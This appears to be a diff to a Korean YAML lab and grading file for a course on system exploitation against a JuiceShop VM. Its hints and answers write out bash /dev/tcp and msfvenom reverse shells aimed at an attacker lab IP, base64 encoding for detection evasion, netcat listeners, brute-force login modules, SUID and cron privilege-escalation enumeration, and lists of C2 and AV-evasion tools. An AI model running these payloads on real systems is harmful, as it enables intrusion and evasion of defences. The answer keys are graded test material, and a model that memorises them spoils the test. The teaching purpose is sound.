@@ -16,7 +16,20 @@ steps:
 - order: 1
   instruction: searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을
     검색하라.
-  hint: searchsploit 서비스명 버전 형태로 검색한다
+  hint: |
+    searchsploit 서비스명 버전 형태로 검색한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: searchsploit apache 2.4 && echo '---' && searchsploit openssh
+    2) 미설치: sudo apt install -y exploitdb && searchsploit -u
+    3) 실패/대안:
+       - exploit-db.com 웹 검색
+       - msfconsole -q -x 'search type:exploit name:apache; exit'
+       - vulners-cli (CVE 매핑 + exploit)
+       - cve-search 자체 호스팅
+       - rapid7 vulnerability database
+       - cvedetails.com
+    4) 검증: EDB-ID + Path. -m 으로 PoC 복사.
   category: recon
   points: 10
   answer: searchsploit apache 2.4 && echo '---' && searchsploit openssh
@@ -36,16 +49,35 @@ steps:
       - searchsploit apache 2.4 + openssh
       - 서비스명+버전 검색
       acceptable_methods:
-      - searchsploit
-      - Exploit-DB 웹
-      - Metasploit search type:exploit
+      - "searchsploit apache 2.4 + openssh (수기 baseline)."
+      - "Exploit-DB 웹."
+      - "msfconsole search type:exploit."
+      - "vulners-cli."
+      - "cve-search 자체 호스팅."
+      - "rapid7 vulnerability database."
+      - "cvedetails.com."
+      - "Bastion AI exploit 추천 orchestrator."
       negative_signs:
       - searchsploit 없음
       - 버전 매칭 맥락 없음
   target_vm: attacker
 - order: 2
   instruction: msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색하라.
-  hint: msfconsole -q -x 'search type:exploit http; exit' 형태로 실행한다
+  hint: |
+    msfconsole -q -x 'search type:exploit http; exit' 형태로 실행한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head -30
+    2) 미설치: sudo apt install -y metasploit-framework
+    3) 실패/대안:
+       - msfconsole 대화형 + search
+       - msf-pro / Pro Console
+       - Cobalt Strike (상용)
+       - Empire / Starkiller (PowerShell C2)
+       - Sliver (오픈소스 C2)
+       - Caldera (MITRE C2 emulation)
+       - searchsploit + exploit-db.com 우회
+    4) 검증: exploit 키워드 + Disclosure Date.
   category: recon
   points: 10
   answer: msfconsole -q -x 'search type:exploit name:nodejs; exit' 2>/dev/null | head
@@ -64,16 +96,34 @@ steps:
       - msfconsole -q -x search
       - type:exploit name:nodejs
       acceptable_methods:
-      - msfconsole search
-      - msfdb search
-      - online Rapid7 DB
+      - "msfconsole -q -x search (수기 baseline)."
+      - "msfdb search."
+      - "Rapid7 online DB."
+      - "msf-pro Pro Console."
+      - "Empire / Starkiller."
+      - "Sliver C2."
+      - "Caldera (MITRE)."
+      - "Bastion AI exploit 추천."
       negative_signs:
       - msfconsole 없음
       - search 명령 없음
   target_vm: attacker
 - order: 3
   instruction: JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집하라.
-  hint: auxiliary/scanner/http/http_version 모듈을 사용한다
+  hint: |
+    auxiliary/scanner/http/http_version 모듈을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: msfconsole -q -x 'use auxiliary/scanner/http/http_version; set RHOSTS 10.20.30.80; set RPORT 3000; run; exit' 2>/dev/null
+    2) 미설치: sudo apt install -y metasploit-framework
+    3) 실패/대안:
+       - whatweb -v http://10.20.30.80:3000
+       - curl -I (Server 헤더)
+       - nikto -h 10.20.30.80:3000
+       - wappalyzer-cli
+       - httpx -title -tech-detect
+       - nmap -sV --script http-headers
+    4) 검증: Server / X-Powered-By. recon 단계.
   category: recon
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -94,16 +144,34 @@ steps:
       - auxiliary/scanner/http/http_version
       - RHOSTS + RPORT + run
       acceptable_methods:
-      - msfconsole auxiliary 모듈
-      - msfcli
-      - armitage GUI
+      - "msfconsole auxiliary/scanner/http/http_version (수기 baseline)."
+      - "whatweb -v."
+      - "curl -I (Server 헤더)."
+      - "nikto -h."
+      - "wappalyzer-cli."
+      - "httpx -title -tech-detect."
+      - "nmap -sV --script http-headers."
+      - "Bastion AI HTTP recon orchestrator."
       negative_signs:
       - auxiliary 모듈 없음
       - scanner 맥락 없음
   target_vm: attacker
 - order: 4
   instruction: netcat으로 간단한 리버스 셸 리스너를 설정하라. 포트 4444에서 연결을 대기하라(5초 후 자동 종료).
-  hint: nc -lvnp 포트 형태로 리스너를 설정한다
+  hint: |
+    nc -lvnp 포트 형태로 리스너를 설정한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep 1 && echo test | nc -w 1 localhost 4444
+    2) 미설치: sudo apt install -y ncat netcat-openbsd
+    3) 실패/대안:
+       - ncat --listen -p 4444 -v
+       - socat TCP-LISTEN:4444,reuseaddr -
+       - pwncat-cs (autoupgrade tty)
+       - rlwrap nc -lvnp 4444 (raw line edit)
+       - python3 -c "import socket; s=socket.socket(); s.bind(('',4444)); s.listen(1)..."
+       - msfconsole multi/handler
+    4) 검증: Listening on / connection received. T1059.
   category: exploit
   points: 10
   answer: timeout 5 nc -lvnp 4444 2>&1 & echo 'Listener started on port 4444' && sleep
@@ -124,10 +192,14 @@ steps:
       - nc -lvnp 4444
       - 5초 타임아웃
       acceptable_methods:
-      - nc -lvnp
-      - ncat --listen -p
-      - socat TCP-LISTEN
-      - pwncat-cs
+      - "nc -lvnp 4444 (수기 baseline)."
+      - "ncat --listen -p."
+      - "socat TCP-LISTEN."
+      - "pwncat-cs (autoupgrade tty)."
+      - "rlwrap nc -lvnp."
+      - "python3 socket bind+listen."
+      - "msfconsole multi/handler."
+      - "Bastion AI 리스너 orchestrator."
       negative_signs:
       - nc -l 없음
       - 포트 4444 없음
@@ -136,7 +208,20 @@ steps:
 - order: 5
   instruction: bash 리버스 셸 페이로드를 생성하라. python3으로 {{ATTACKER_IP}}:4444로 연결하는 리버스 셸 명령을
     출력하라(실행하지 않고 출력만).
-  hint: bash -i >& /dev/tcp/IP/PORT 0>&1 형태이다
+  hint: |
+    bash -i >& /dev/tcp/IP/PORT 0>&1 형태이다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: echo 'Bash: bash -i >& /dev/tcp/10.20.30.201/4444 0>&1' && echo 'Python: python3 -c "..."' && echo 'Netcat: nc -e /bin/bash IP 4444'
+    2) 미설치: 페이로드 출력만 (실행 X)
+    3) 실패/대안:
+       - perl/php/ruby/golang reverse shell
+       - revshells.com 페이로드 생성기
+       - PayloadsAllTheThings 깃허브
+       - HoaxShell (HTTP 기반)
+       - Chisel (TCP tunneling)
+       - GTFOBins 셸 escape
+    4) 검증: 다양한 언어 페이로드 + IP/PORT 일치. T1059.
   category: exploit
   points: 10
   answer: 'echo ''=== Reverse Shell Payloads ==='' && echo ''Bash: bash -i >& /dev/tcp/10.20.30.201/4444
@@ -158,10 +243,14 @@ steps:
       - Bash + Python + Netcat 3개 이상
       - IP:PORT 명시
       acceptable_methods:
-      - bash /dev/tcp 리버스
-      - python socket + subprocess
-      - nc -e /bin/bash
-      - msfvenom shell_reverse_tcp
+      - "bash /dev/tcp + python + nc 3종 (수기 baseline)."
+      - "perl/php/ruby/golang reverse shell."
+      - "msfvenom shell_reverse_tcp."
+      - "revshells.com 페이로드 생성기."
+      - "PayloadsAllTheThings 깃허브."
+      - "HoaxShell (HTTP 기반)."
+      - "Chisel TCP tunneling."
+      - "Bastion AI 페이로드 생성 orchestrator."
       negative_signs:
       - 페이로드 2개 이하
       - T1059 맥락 없음
@@ -169,7 +258,21 @@ steps:
 - order: 6
   instruction: msfvenom을 사용하여 Linux x64 리버스 셸 ELF 바이너리를 생성하라. LHOST={{ATTACKER_IP}},
     LPORT=4444로 설정하라.
-  hint: msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다
+  hint: |
+    msfvenom -p linux/x64/shell_reverse_tcp 옵션을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f elf -o /tmp/reverse_shell.elf && file /tmp/reverse_shell.elf
+    2) 미설치: sudo apt install -y metasploit-framework
+    3) 실패/대안:
+       - msfvenom + -e x64/xor_dynamic 인코더
+       - Veil Framework (AV 회피)
+       - Shellter (PE injection)
+       - Donut (.NET assembly)
+       - shellcraft (pwntools): shellcraft.amd64.linux.connect
+       - C 자작 + execve()
+       - GarbleBin (Go obfuscation)
+    4) 검증: ELF 64-bit + LHOST/LPORT.
   category: exploit
   points: 10
   answer: msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f
@@ -190,10 +293,14 @@ steps:
       - msfvenom -p linux/x64/shell_reverse_tcp
       - LHOST/LPORT + -f elf
       acceptable_methods:
-      - msfvenom -p -f elf
-      - msfvenom + encoder
-      - Veil Framework
-      - Shellter
+      - "msfvenom -p linux/x64/shell_reverse_tcp -f elf (수기 baseline)."
+      - "msfvenom + encoder (xor_dynamic)."
+      - "Veil Framework (AV 회피)."
+      - "Shellter PE injection."
+      - "Donut .NET assembly."
+      - "pwntools shellcraft."
+      - "C 자작 + execve()."
+      - "Bastion AI 페이로드 빌더."
       negative_signs:
       - msfvenom 없음
       - -f elf 없음
@@ -202,7 +309,21 @@ steps:
 - order: 7
   instruction: web 서버({{WEB_IP}})에 SSH로 접속하여 커널 버전과 배포판 정보를 확인하라. 이는 커널 익스플로잇 선택에
     필요한 정보이다.
-  hint: uname -a와 cat /etc/os-release 명령을 실행한다
+  hint: |
+    uname -a와 cat /etc/os-release 명령을 실행한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
+    2) 미설치: sudo apt install -y openssh-client
+    3) 실패/대안:
+       - ssh + hostnamectl
+       - ssh + lsb_release -a
+       - ssh + cat /etc/issue
+       - LinPEAS 자동 수집 (linpeas.sh)
+       - linenum.sh
+       - linux-exploit-suggester.sh
+       - ssh + neofetch
+    4) 검증: Linux + 커널 버전. LPE exploit 매핑. T1082.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'uname -a && echo --- && cat /etc/os-release' 2>/dev/null
@@ -220,9 +341,14 @@ steps:
       - ssh + uname -a + /etc/os-release
       - 커널 버전 확인
       acceptable_methods:
-      - ssh + uname
-      - ssh + hostnamectl
-      - LinPEAS 자동 수집
+      - "ssh + uname -a + /etc/os-release (수기 baseline)."
+      - "ssh + hostnamectl."
+      - "ssh + lsb_release -a."
+      - "ssh + cat /etc/issue."
+      - "LinPEAS 자동 수집."
+      - "linenum.sh."
+      - "linux-exploit-suggester.sh."
+      - "Bastion AI LPE 분석 orchestrator."
       negative_signs:
       - uname -a 없음
       - 커널 버전 맥락 없음
@@ -230,7 +356,21 @@ steps:
   target_vm: attacker
 - order: 8
   instruction: web 서버에서 실행 중인 서비스 목록을 확인하라. 잠재적으로 취약한 서비스를 식별하라.
-  hint: systemctl list-units --type=service로 서비스를 확인한다
+  hint: |
+    systemctl list-units --type=service로 서비스를 확인한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running' 2>/dev/null | head -30
+    2) 미설치: sudo apt install -y openssh-client systemd
+    3) 실패/대안:
+       - ssh + ps aux
+       - ssh + ss -tlnp
+       - ssh + service --status-all
+       - ssh + chkconfig --list
+       - LinPEAS (자동 enum)
+       - linenum.sh
+       - osquery 'select * from listening_ports'
+    4) 검증: 서비스명 + 상태 active.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'systemctl list-units --type=service --state=running'
@@ -249,9 +389,14 @@ steps:
       - systemctl list-units --state=running
       - ssh 원격 실행
       acceptable_methods:
-      - systemctl list-units
-      - ps aux
-      - ss -tlnp
+      - "ssh + systemctl list-units --state=running (수기 baseline)."
+      - "ssh + ps aux."
+      - "ssh + ss -tlnp."
+      - "ssh + service --status-all."
+      - "chkconfig --list."
+      - "LinPEAS 자동 enum."
+      - "linenum.sh."
+      - "osquery listening_ports."
       negative_signs:
       - systemctl 없음
       - 실행 서비스 맥락 없음
@@ -259,7 +404,20 @@ steps:
 - order: 9
   instruction: curl로 JuiceShop의 /api/Quantitys 엔드포인트에 접근하여 에러 메시지에서 스택 트레이스가 노출되는지
     확인하라.
-  hint: 존재하지 않는 API에 접근하면 프레임워크 에러가 노출될 수 있다
+  hint: |
+    존재하지 않는 API에 접근하면 프레임워크 에러가 노출될 수 있다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: curl -s http://10.20.30.80:3000/api/Quantitys 2>/dev/null | python3 -m json.tool 2>/dev/null || curl -s http://10.20.30.80:3000/api/Quantitys
+    2) 미설치: sudo apt install -y curl python3
+    3) 실패/대안:
+       - Burp Repeater 에러 유도
+       - ffuf -w common.txt -u .../FUZZ
+       - Param Miner (Burp extension)
+       - graphql-cop (GraphQL)
+       - nuclei -t exposures/
+       - feroxbuster -u
+    4) 검증: stack trace / file path. CWE-209.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -282,16 +440,31 @@ steps:
       - curl /api/Quantitys (존재하지 않는 엔드포인트)
       - 에러 응답 확인
       acceptable_methods:
-      - curl 존재하지 않는 엔드포인트
-      - Burp Repeater 에러 유도
-      - fuzzing
-      negative_signs:
-      - 에러 유도 없음
-      - CWE-209 맥락 없음
+      - "curl /api/Quantitys + python3 json.tool (수기 baseline)."
+      - "Burp Repeater 에러 유도."
+      - "ffuf -w common.txt."
+      - "Param Miner (Burp extension)."
+      - "graphql-cop / clairvoyance."
+      - "nuclei -t exposures/."
+      - "feroxbuster -u."
+      - "Bastion AI Info Disclosure 분석."
   target_vm: attacker
 - order: 10
   instruction: python3으로 간단한 포트 스캐너를 작성하고 {{WEB_IP}}의 1-1024 포트를 스캔하라.
-  hint: socket.connect_ex()를 사용하여 포트 상태를 확인한다
+  hint: |
+    socket.connect_ex()를 사용하여 포트 상태를 확인한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: python3 -c "import socket; [print(f'Port {p}: OPEN') for p in range(1,1025) if socket.socket(socket.AF_INET, socket.SOCK_STREAM).connect_ex(('10.20.30.80', p)) == 0]" 2>/dev/null
+    2) 미설치: sudo apt install -y python3
+    3) 실패/대안:
+       - nmap -sT -p 1-1024 (TCP connect)
+       - rustscan -a 10.20.30.80 -p 1-1024
+       - masscan -p 1-1024
+       - nc -zv 10.20.30.80 1-1024
+       - naabu -host -p 1-1024
+       - go raw socket scanner
+    4) 검증: OPEN 포트 목록. socket.connect_ex==0.
   category: exploit
   points: 10
   answer: 'python3 -c "import socket; [print(f''Port {p}: OPEN'') for p in range(1,1025)
@@ -311,16 +484,31 @@ steps:
       - socket.connect_ex + range(1,1025)
       - 포트 1-1024
       acceptable_methods:
-      - python socket.connect_ex
-      - nmap -sT
-      - nc -zv
-      negative_signs:
-      - socket 없음
-      - 1-1024 범위 아님
+      - "python socket.connect_ex (수기 baseline)."
+      - "nmap -sT -p 1-1024."
+      - "rustscan -a IP -p 1-1024."
+      - "masscan -p 1-1024."
+      - "nc -zv IP 1-1024."
+      - "naabu -host."
+      - "go raw socket scanner."
+      - "Bastion AI 포트스캔 orchestrator."
   target_vm: attacker
 - order: 11
   instruction: Metasploit의 http_login auxiliary 모듈을 사용하여 JuiceShop의 기본 인증을 테스트하라.
-  hint: auxiliary/scanner/http/http_login 모듈을 사용한다
+  hint: |
+    auxiliary/scanner/http/http_login 모듈을 사용한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: msfconsole -q -x 'use auxiliary/scanner/http/http_login; set RHOSTS 10.20.30.80; set RPORT 3000; set AUTH_URI /rest/user/login; info; exit' 2>/dev/null | head -30
+    2) 미설치: sudo apt install -y metasploit-framework
+    3) 실패/대안:
+       - hydra http-post-form
+       - patator http_fuzz
+       - Burp Intruder Sniper
+       - ffuf -d 'json' fuzz
+       - medusa -M http
+       - ncrack
+    4) 검증: AUTH_URI 설정 + Basic/Digest/Form 인증. T1110.
   category: exploit
   points: 10
   answer: '🖥️ UI: 브라우저에서 http://WEB_IP:3000 접속
@@ -343,17 +531,32 @@ steps:
       - auxiliary/scanner/http/http_login
       - AUTH_URI 설정
       acceptable_methods:
-      - msfconsole http_login
-      - hydra http-post-form
-      - Burp Intruder
-      negative_signs:
-      - http_login 모듈 없음
-      - AUTH_URI 없음
+      - "msfconsole http_login (수기 baseline)."
+      - "hydra http-post-form."
+      - "patator http_fuzz."
+      - "Burp Intruder Sniper."
+      - "ffuf -d json fuzz."
+      - "medusa -M http."
+      - "ncrack -p 3000."
+      - "Bastion AI 인증 brute orchestrator."
   target_vm: attacker
 - order: 12
   instruction: web 서버에서 crontab 설정을 확인하여 자동 실행되는 작업이 있는지 검사하라. 잘못 설정된 cronjob은 권한
     상승에 활용될 수 있다.
-  hint: SSH로 접속하여 crontab -l과 /etc/crontab을 확인한다
+  hint: |
+    SSH로 접속하여 crontab -l과 /etc/crontab을 확인한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab 2>/dev/null; echo ---; ls -la /etc/cron.d/ 2>/dev/null' 2>/dev/null
+    2) 미설치: sudo apt install -y openssh-client
+    3) 실패/대안:
+       - ssh + cat /var/spool/cron/crontabs/*
+       - pspy (커널 hook 기반 cron 추적)
+       - LinPEAS (cron 자동 enum)
+       - linenum.sh
+       - ssh + ls /etc/cron.{daily,hourly,weekly,monthly}
+       - systemctl list-timers (systemd timer)
+    4) 검증: world-writable + root cron → LPE. GTFOBins.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'crontab -l 2>/dev/null; echo ---; cat /etc/crontab
@@ -372,16 +575,32 @@ steps:
       - crontab -l + /etc/crontab + /etc/cron.d
       - ssh 원격
       acceptable_methods:
-      - crontab -l
-      - systemctl list-timers
-      - pspy process monitor
-      negative_signs:
-      - crontab 조회 없음
-      - 권한 상승 맥락 없음
+      - "ssh + crontab -l + /etc/crontab + /etc/cron.d (수기 baseline)."
+      - "/var/spool/cron/crontabs/*."
+      - "pspy 커널 hook 모니터."
+      - "LinPEAS cron enum."
+      - "linenum.sh."
+      - "/etc/cron.{daily,hourly,weekly,monthly}."
+      - "systemctl list-timers (systemd timer)."
+      - "Bastion AI cron audit orchestrator."
   target_vm: attacker
 - order: 13
   instruction: web 서버의 SUID 바이너리를 검색하라. 비정상적인 SUID 바이너리는 권한 상승에 활용할 수 있다.
-  hint: find / -perm -4000 명령으로 SUID 파일을 검색한다
+  hint: |
+    find / -perm -4000 명령으로 SUID 파일을 검색한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - find / -perm -u=s -type f
+       - getcap -r / 2>/dev/null (Capabilities)
+       - ssh + LinPEAS auto SUID enum
+       - linux-smart-enumeration (lse.sh)
+       - linenum.sh
+       - GTFOBins (수동 매핑)
+       - linpwn / linux-exploit-suggester
+    4) 검증: SUID list. GTFOBins escape 매핑.
   category: recon
   points: 10
   answer: ssh ccc@10.20.30.80 'find / -perm -4000 -type f 2>/dev/null' 2>/dev/null
@@ -399,18 +618,33 @@ steps:
       - find -perm -4000
       - ssh 원격
       acceptable_methods:
-      - find -perm -4000
-      - linpeas.sh
-      - GTFOBins
-      - LinEnum
-      negative_signs:
-      - -perm -4000 없음
-      - SUID 맥락 없음
-      - GTFOBins 맥락 없음
+      - "ssh + find / -perm -4000 (수기 baseline)."
+      - "find / -perm -u=s."
+      - "getcap -r / (Capabilities)."
+      - "LinPEAS auto enum."
+      - "linux-smart-enumeration (lse.sh)."
+      - "linenum.sh."
+      - "GTFOBins 매핑."
+      - "linux-exploit-suggester."
   target_vm: attacker
 - order: 14
   instruction: msfvenom으로 Python 리버스 셸 페이로드를 생성하라. base64로 인코딩하여 탐지를 회피하라.
-  hint: msfvenom -f python 출력을 base64 인코딩한다
+  hint: |
+    msfvenom -f python 출력을 base64 인코딩한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw 2>/dev/null | base64 | head -5 && echo '...(truncated)'
+    2) 미설치: sudo apt install -y metasploit-framework
+    3) 실패/대안:
+       - msfvenom -e -i (인코더 반복)
+       - Veil Framework (Python 회피)
+       - Shellter 동적 인젝션
+       - Donut .NET → x64
+       - python pyinstaller → ELF
+       - PyArmor obfuscation
+       - PowerShell Invoke-Obfuscation
+       - garble Go obfuscation
+    4) 검증: base64 시그니처 회피. T1027.
   category: exploit
   points: 15
   answer: msfvenom -p python/shell_reverse_tcp LHOST=10.20.30.201 LPORT=4444 -f raw
@@ -432,17 +666,33 @@ steps:
       - msfvenom -f raw + base64
       - python/shell_reverse_tcp
       acceptable_methods:
-      - msfvenom + base64 파이프
-      - Veil Framework 인코딩
-      - Shellter 동적 인젝션
-      negative_signs:
-      - base64 인코딩 없음
-      - AV 회피 맥락 없음
+      - "msfvenom + base64 파이프 (수기 baseline)."
+      - "msfvenom -e (인코더)."
+      - "Veil Framework Python 회피."
+      - "Shellter 동적 인젝션."
+      - "Donut .NET assembly."
+      - "PyArmor obfuscation."
+      - "Invoke-Obfuscation (PowerShell)."
+      - "Bastion AI 페이로드 obfuscation."
   target_vm: attacker
 - order: 15
   instruction: 시스템 익스플로잇 실습 결과를 /tmp/exploit_report.txt에 정리하라. 공격 경로, 획득한 정보, 보안 권고를
     포함하라.
-  hint: Kill chain 순서로 정리한다
+  hint: |
+    Kill chain 순서로 정리한다.
+
+    📎 도구 우선순위 (힌트):
+    1) 우선: heredoc/echo -e > /tmp/exploit_report.txt 후 [Attack Surface]/[Findings]/[Kill Chain Progress]/[Recommendations] 4섹션. Lockheed Martin Kill Chain 7단계 매핑.
+    2) 미설치: 기본 coreutils
+    3) 실패/대안:
+       - python jinja2 markdown
+       - dradis 보고서 도구
+       - serpico 자동 보고서
+       - Faraday IDE export
+       - markdown + pandoc PDF
+       - Lockheed Martin Kill Chain 표
+       - MITRE ATT&CK Navigator export
+    4) 검증: cat 으로 4 섹션. CVE 매핑.
   category: analysis
   points: 15
   answer: 'echo -e ''=== System Exploit Report ===\n\n[Attack Surface]\n- Apache 2.4
@@ -470,65 +720,66 @@ steps:
       - Attack Surface + Findings + Kill Chain + Recommendations 4섹션
       - Kill Chain 단계
       acceptable_methods:
-      - echo > 보고서
-      - Lockheed Kill Chain template
-      - MITRE ATT&CK Navigator
-      negative_signs:
-      - 섹션 2개 이하
-      - Kill Chain 맥락 없음
-      - Recommendations 없음
+      - "heredoc > 보고서 (수기 baseline)."
+      - "Lockheed Kill Chain 7단계 매핑."
+      - "MITRE ATT&CK Navigator export."
+      - "python jinja2 markdown."
+      - "dradis 보고서 도구."
+      - "serpico 자동 보고서."
+      - "Faraday IDE export."
+      - "markdown + pandoc PDF."
   target_vm: attacker
 - order: 99
   instruction: |
     [복합 시나리오] "CTF 동아리 팀장 — 신입 walkthrough + Discord FAQ"
 
-    ## 상황 — 신학기 첫 워크샵, 신입 5명
+    ■ 상황 — 신학기 첫 워크샵, 신입 5명
 
     당신은 보안 동아리 *0xINIT* 팀장 (3학년). JuiceShop walkthrough 를 *Discord 게시글* 형식으로 작성.
     딱딱한 보고서 X — 신입이 따라할 수 있게 친근하게.
 
-    > 0xINIT-팀장: "안녕 신입들 ㅎㅎ 첫 워크샵. 주제는 *익스플로잇 파이프라인* — 단일 PoC 보다 *연결* 이 핵심.
-    > 6 단계 walkthrough + FAQ. 막히면 #help 채널에 ATT&CK ID 같이 적어 ㄱㄱ"
+    ※ 0xINIT-팀장: "안녕 신입들 ㅎㅎ 첫 워크샵. 주제는 *익스플로잇 파이프라인* — 단일 PoC 보다 *연결* 이 핵심.
+    ※ 6 단계 walkthrough + FAQ. 막히면 #help 채널에 ATT&CK ID 같이 적어 ㄱㄱ"
 
     학습 목표 (lecture #2 업로드 + #3 Path Traversal + #4 /ftp) + (lab #1·#5·#10·#12·#13) 통합.
 
-    ## Walkthrough (6 단계, 약 40분)
+    ■ Walkthrough (6 단계, 약 40분)
 
     Non-AI 트랙: ssh ccc@10.20.30.201 (attacker VM) 직접 실행.
 
-    ### Step 1 — searchsploit 정찰
+    ▶ Step 1 — searchsploit 정찰
     `searchsploit -t "juice shop" 2>&1 | head -10`
     `searchsploit -t "express" 2>&1 | head -10`
 
-    > FAQ Q1: "결과 안 나옴" → exploitdb 패키지 확인 (`which searchsploit`).
+    ※ FAQ Q1: "결과 안 나옴" → exploitdb 패키지 확인 (`which searchsploit`).
 
-    ### Step 2 — SSRF/LFI 입구 탐색
+    ▶ Step 2 — SSRF/LFI 입구 탐색
     `for p in '/redirect?to=http://127.0.0.1:22' '/ftp/../../etc/passwd' '/ftp/package.json.bak%2500.md'; do
        echo "=== $p ==="; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000$p"; done`
 
-    > FAQ Q2: "%2500 작동 안함" → Node 12+ fs API 거부. /ftp legacy 만 가능. 응답 코드가 학습.
+    ※ FAQ Q2: "%2500 작동 안함" → Node 12+ fs API 거부. /ftp legacy 만 가능. 응답 코드가 학습.
 
-    ### Step 3 — /ftp 민감 파일
+    ▶ Step 3 — /ftp 민감 파일
     `for f in 'package.json.bak' 'coupons_2013.md.bak' 'eastere.gg' 'announcement_encrypted.md'; do
        echo "=== /ftp/$f ==="; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/ftp/$f"; done`
 
-    > FAQ Q3: "차단되어도 계속?" → 응답 코드가 학습. 200/403 둘 다 기록.
+    ※ FAQ Q3: "차단되어도 계속?" → 응답 코드가 학습. 200/403 둘 다 기록.
 
-    ### Step 4 — Reverse shell payload (출력만, 실행 X)
+    ▶ Step 4 — Reverse shell payload (출력만, 실행 X)
     `python3 -c "import sys; payload='bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'; print('Payload (DO NOT RUN):'); print(payload)"`
 
-    > FAQ Q4: "왜 실행하면 안됨?" → ① 수업 룰 ② 정통망법 제48조. 페이로드 작성 자체 학습.
+    ※ FAQ Q4: "왜 실행하면 안됨?" → ① 수업 룰 ② 정통망법 제48조. 페이로드 작성 자체 학습.
 
-    ### Step 5 — Listener 5초 모의
+    ▶ Step 5 — Listener 5초 모의
     `sudo -n timeout 5 nc -lvnp 4444 2>&1 | head -5 || nc -lvnp 4444 -w 5 2>&1 | head -5`
 
-    > FAQ Q5: "permission denied" → 1024 미만 root 필요. 4444 OK. timeout 5 자동 종료.
+    ※ FAQ Q5: "permission denied" → 1024 미만 root 필요. 4444 OK. timeout 5 자동 종료.
 
-    ### Step 6 — Post-exploit 정찰 (SUID/cron)
+    ▶ Step 6 — Post-exploit 정찰 (SUID/cron)
     `find / -perm -4000 -type f 2>/dev/null | head -10`
     `crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null | head -5`
 
-    > FAQ Q6: "권한 상승 가능?" → SUID → GTFOBins / cron 잘못 설정 → root 작업 hijack. w08 실 시연.
+    ※ FAQ Q6: "권한 상승 가능?" → SUID → GTFOBins / cron 잘못 설정 → root 작업 hijack. w08 실 시연.
 
     [팀장 마무리]
     "오늘 핵심: *입구 → 파일 → 페이로드 → 리스너 → post-exploit* 흐름. 단일 PoC X, *연결 사슬*."
@@ -540,6 +791,17 @@ steps:
     Step 6: post-exploit 정찰.
     각 step + FAQ 1개. Discord 친근한 톤.
     포인트: walkthrough + FAQ 형식. CTF 동아리 페르소나.
+
+    📎 도구 우선순위 (힌트):
+    1) Step 1 정찰: searchsploit + msfconsole search.
+    2) Step 2 입구 SSRF/LFI: curl multi-path + http_code.
+    3) Step 3 파일: ssh + find/cat /etc/passwd, /etc/shadow.
+    4) Step 4 페이로드: msfvenom + revshells.com (출력만).
+    5) Step 5 리스너: timeout 5 nc -lvnp 4444 + 5초 자동 종료.
+    6) Step 6 post-exploit: SUID/cron/uname (LinPEAS 빠른 enum).
+    7) 미설치 시: sudo apt install -y exploitdb metasploit-framework ncat
+    8) FAQ 형식: Discord 마크다운 (### 헤더 + ※ 인용 + 친근 표현).
+    9) 정통망법 제48조 준수: 실 reverse shell 실행 금지, payload 출력만.
   category: integration_scenario
   points: 50
   verify:
@@ -556,10 +818,14 @@ steps:
       - 마지막 팀장 마무리
       - 친근한 톤 (선임/멘토 X)
       acceptable_methods:
-      - searchsploit / curl / python3 / nc / find / crontab
-      - sudo -n / timeout
-      - heredoc walkthrough
-      - 친근한 표현 OK (ㅎㅎ ㄱㄱ 등)
+      - "Step 1 searchsploit + msfconsole search (수기 baseline)."
+      - "Step 2 curl multi-path SSRF/LFI."
+      - "Step 3 ssh + find/cat /etc/passwd."
+      - "Step 4 msfvenom 페이로드 출력만."
+      - "Step 5 timeout 5 nc -lvnp 4444."
+      - "Step 6 SUID/cron/uname enum."
+      - "Discord 마크다운 형식 (### + ※)."
+      - "친근한 표현 (ㅎㅎ ㄱㄱ)."
       negative_signs:
       - step 4 이하
       - FAQ 없음
